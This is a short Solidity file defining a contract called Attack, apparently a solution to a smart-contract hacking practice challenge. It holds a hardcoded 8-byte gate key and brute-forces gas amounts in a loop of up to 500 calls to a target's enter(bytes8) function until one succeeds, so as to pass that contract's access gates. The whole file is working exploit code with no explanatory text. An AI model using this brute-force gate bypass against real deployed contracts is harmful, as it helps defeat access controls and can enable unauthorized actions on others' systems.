// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract Attack {
    bytes8 public constant _GateKey = 0x000000010000D07C;


    function attack(address payable _addr) external{
        for (uint256 i = 0; i < 500; i++) {
            (bool success, ) = _addr.call{gas : 8191*3 + i}(abi.encodeWithSignature("enter(bytes8)", _GateKey));
            if(success){
                return;
            }
        }
    }

}

